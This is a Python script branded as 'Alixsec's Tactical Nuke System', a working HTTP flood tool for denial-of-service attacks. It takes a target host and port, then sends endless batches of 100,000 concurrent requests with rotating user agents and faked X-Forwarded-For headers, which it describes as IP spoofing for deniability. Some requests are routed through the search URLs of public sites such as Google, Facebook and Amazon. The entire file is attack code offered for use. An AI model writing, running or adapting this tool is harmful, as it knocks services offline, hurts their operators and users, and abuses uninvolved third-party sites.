
# Made By Alixsec
import os
import random
import time
import asyncio
import aiohttp
from rich.console import Console
from colorama import Fore, Style, init

# Initialize colorama and rich console
init(autoreset=True)
console = Console()

# Status tracking for requests sent
status_counts = {
    '200': 0,
    '404': 0,
    '500': 0,
    'timeout': 0,
    'failed': 0,
    'client_error': 0,
    'server_error': 0,
}

# Global request counter
request_counter = 0

# Display the missile-themed banner
def display_banner():
    banner = f"""
    {Fore.RED}***************************************************
    {Fore.YELLOW}      ╔════════════════════════════════════╗
    {Fore.YELLOW}      ║    Alixsec's Tactical Nuke System  ║
    {Fore.YELLOW}      ║          MISSILE  v1.0             ║
    {Fore.YELLOW}      ║         FREE PALESTINE!            ║
    {Fore.YELLOW}      ╚════════════════════════════════════╝

    {Fore.GREEN}                __       __       __       __
    {Fore.RED}              /  ╦>{Fore.YELLOW}   / ╦>{Fore.GREEN}   / ╦>{Fore.YELLOW}   / ╦>
    {Fore.RED}             /____╩>{Fore.YELLOW} /___╩>{Fore.GREEN} /___╩>{Fore.YELLOW} /___╩>
    
    {Fore.RED}     ╔═══════════════════════════╗
    {Fore.RED}     ║       TARGET LOCKED       ║
    {Fore.RED}     ╚═══════════════════════════╝

    {Fore.GREEN}     >>> OBLITERATION BEGINS NOW <<<    
    {Fore.YELLOW}***************************************************
    """
    console.print(banner, style="bold")

# Function to get bots from search engines and social media platforms
def get_bots():
    return [
        # Search Engines
        "http://www.google.com/search?q=",
        "http://www.bing.com/search?q=",
        "http://www.baidu.com/s?wd=",
        "http://www.yahoo.com/search?p=",
        "http://www.yandex.com/search?text=",
        "http://duckduckgo.com/?q=",
        "http://www.ask.com/web?q=",
        "http://search.aol.com/aol/search?q=",
        "http://www.ecosia.org/search?q=",
        "http://www.lycos.com/web?q=",

        # Social Media Bots
        "http://www.facebook.com/search/top?q=",
        "http://www.instagram.com/web/search/topsearch/?context=blended&query=",
        "http://twitter.com/search?q=",
        "http://www.linkedin.com/search/results/all/?keywords=",
        "http://t.me/s/",  # Telegram search
        "http://www.reddit.com/search/?q=",
        "http://www.pinterest.com/search/?q=",
        "http://vk.com/search?c[q]=",
        "http://www.tumblr.com/search?q=",
        "http://weibo.com/search?q=",
        "http://mix.com/search?q=",

        # News Bots
        "http://www.nytimes.com/search?query=",
        "http://www.theguardian.com/search?q=",
        "http://www.bbc.co.uk/search?q=",
        "http://www.cnn.com/search/?q=",
        "http://www.nbcnews.com/search/?q=",
        "http://www.foxnews.com/search-results/search?q=",
        "http://www.reuters.com/search/news?blob=",
        "http://www.aljazeera.com/Search/?q=",
        "http://www.huffpost.com/search?q=",
        "http://www.bloomberg.com/search?q=",
        "http://www.forbes.com/search/?q=",

        # E-commerce Crawlers
        "http://www.amazon.com/s?k=",
        "http://www.ebay.com/sch/i.html?_nkw=",
        "http://www.alibaba.com/trade/search?SearchText=",
        "http://www.flipkart.com/search?q=",
        "http://www.walmart.com/search/?query=",
        "http://www.etsy.com/search?q=",
        "http://www.shopify.com/search?q=",
        "http://www.bestbuy.com/site/searchpage.jsp?st=",
        "http://www.target.com/s?searchTerm=",
        "http://www.newegg.com/p/pl?d=",
        "http://www.mercadolibre.com/jm/search?q=",

        # Streaming/Video Bots
        "http://www.youtube.com/results?search_query=",
        "http://vimeo.com/search?q=",
        "http://www.dailymotion.com/search/",
        "http://www.twitch.tv/search?term=",
        "http://www.netflix.com/search?q=",

        # Music Search Bots
        "http://open.spotify.com/search/",
        "http://soundcloud.com/search?q=",
        "http://www.apple.com/itunes/search/?q=",
        "http://www.pandora.com/search?q=",

        # Map Search Bots
        "http://maps.google.com/maps?q=",
        "http://www.bing.com/maps?q=",
        "http://maps.yahoo.com/#q=",
        "http://www.openstreetmap.org/search?query=",

        # Torrent Search Bots
        "http://www.thepiratebay.org/search/",
        "http://www.1337x.to/search/",
        "http://www.rarbg.to/torrents.php?search=",
        "http://yts.mx/browse-movies/",
        "http://torrentz2.is/search?q=",

        # Crawler & Analytics Bots
        "http://www.similarweb.com/website/",
        "http://moz.com/researchtools/ose/links?site=",
        "http://majestic.com/reports/site-explorer?q=",
        "http://www.alexa.com/siteinfo/",
        "http://uptime.com/check?host=",
        "http://validator.w3.org/check?uri=",
        "http://whois.domaintools.com/",
        "http://www.geopeeker.com/fetch/?url=",

        # Academic Search Bots
        "http://scholar.google.com/scholar?q=",
        "http://www.jstor.org/action/doBasicSearch?Query=",
        "http://ieeexplore.ieee.org/search/searchresult.jsp?queryText=",
        "http://pubmed.ncbi.nlm.nih.gov/?term=",

        # Code Repositories
        "http://github.com/search?q=",
        "http://bitbucket.org/search?q=",
        "http://gitlab.com/search?search=",
        "http://sourceforge.net/directory/?q=",

        # Other Crawlers
        "http://www.archive.org/",
        "http://validator.nu/?doc=",
        "http://downforeveryoneorjustme.com/",
        "http://www.traceroute.org/",
        "http://www.sslshopper.com/ssl-checker.html#hostname=",
        "http://www.webpagetest.org/?url=",
    ]


# Function to pick random user agents for plausible deniability
def user_agents():
    return [
    # Windows User Agents
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
    "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
    "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",

    # Macintosh User Agents
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",

    # Opera User Agents
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",

    # Android User Agents
    "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
    "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 # I will add more Later
]


# IP Spoofing to mask real IP address
def spoof_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# Randomized live update messages
def get_live_update(hit_type):
    updates = {
        'hit': [
            "[MISSILE STRIKE] Direct hit! The target is on fire! 🚀🔥",
            "[BOOM] That one landed square on the server. 💥",
            "[TARGET LOCKED] Missile hit successfully. 💣",
            "[SUCCESS] The missile pierced through the firewall! 💀",
            "[PWNED] The target never saw it coming. 🎯"
        ],
        'miss': [
            "[MISS] Missile veered off course. No impact this time. 🛑",
            "[ERROR] The missile failed to hit. Retargeting... ⚠️",
            "[OFF TARGET] No damage inflicted. 🚫",
            "[ESCAPE] Target dodged this one. Reloading... 🌀"
        ],
        'timeout': [
            "[TIMEOUT] Missile lost in space. Target unreachable. ⏳",
            "[TIMED OUT] No response from the target. 💤",
            "[CONNECTION LOST] Missile failed to reach the destination. 😴"
        ],
        'fail': [
            "[MALFUNCTION] Missile launch failed. 🔧",
            "[SYSTEM ERROR] The missile broke mid-flight! 🚀💥",
            "[GLITCH] Something went wrong, recalibrating attack... 🤖",
        ]
    }
    return random.choice(updates[hit_type])

# Asynchronous attack with random methods and bots
async def async_attack(target, method='GET', session=None, headers=None):
    global request_counter
    try:
        async with session.request(method, url=target, headers=headers) as response:
            request_counter += 1
            if response.status == 200:
                console.print(f"{Fore.GREEN}[HIT] {target} - 200 OK")
                status_counts['200'] += 1
                console.print(get_live_update('hit'))
            elif response.status == 404:
                console.print(f"{Fore.YELLOW}[MISS] {target} - 404 Not Found")
                status_counts['404'] += 1
                console.print(get_live_update('miss'))
            elif response.status == 500:
                console.print(f"{Fore.RED}[IMPACT] {target} - 500 Server Error")
                status_counts['500'] += 1
                console.print(get_live_update('hit'))
            elif response.status >= 400 and response.status < 500:
                console.print(f"{Fore.YELLOW}[CLIENT ERROR] {target} - Status: {response.status}")
                status_counts['client_error'] += 1
                console.print(get_live_update('miss'))
            elif response.status >= 500 and response.status < 600:
                console.print(f"{Fore.RED}[SERVER ERROR] {target} - Status: {response.status}")
                status_counts['server_error'] += 1
                console.print(get_live_update('hit'))
            else:
                console.print(f"{Fore.MAGENTA}[UNKNOWN] {target} - Status: {response.status}")
    except asyncio.TimeoutError:
        console.print(f"{Fore.RED}[TIMEOUT] {target} - Connection timed out.")
        status_counts['timeout'] += 1
        console.print(get_live_update('timeout'))
    except Exception as e:
        console.print(f"{Fore.RED}[ERROR] {target} - Failed: {e}")
        status_counts['failed'] += 1
        console.print(get_live_update('fail'))

# Direct missile attack with async and spoofed IPs
async def missile_direct_attack(target, port, session):
    method = random.choice(['GET', 'POST', 'DELETE'])

    # Randomly decide if we should use a bot URL or target URL
    if random.random() < 0.3:  # 30% chance of using a bot
        bot_url = random.choice(get_bots()) + target
        url = bot_url
    else:
        url = f"http://{target}:{port}"

    headers = {
        'User-Agent': random.choice(user_agents()),
        'X-Forwarded-For': spoof_ip(),
        'Accept': '*/*'
    }
    
    await async_attack(url, method, session=session, headers=headers)

# Async missile launch function
async def launch_missiles_async(target, port):
    timeout = aiohttp.ClientTimeout(total=5)  # Adjusted timeout for faster retries
    connector = aiohttp.TCPConnector(limit=100000, ttl_dns_cache=300)  # Reuse connections
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while True:  # Infinite loop to keep launching attacks
            tasks = []
            for _ in range(100000):  # Create 100000 tasks per batch
                tasks.append(missile_direct_attack(target, port, session))
            await asyncio.gather(*tasks)

# Main launcher function
def launch_missiles(target, port):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(launch_missiles_async(target, port))

# Get inputs from user
def get_inputs():
    target = input("Enter target (IP or Domain): ")
    while True:
        try:
            port = int(input("Enter port to attack (default 443): ") or 443)
            break
        except ValueError:
            console.print(f"{Fore.RED}Invalid port. Try again.")
    return target, port

# Main execution
if __name__ == "__main__":
    display_banner()
    target, port = get_inputs()
    launch_missiles(target, port)
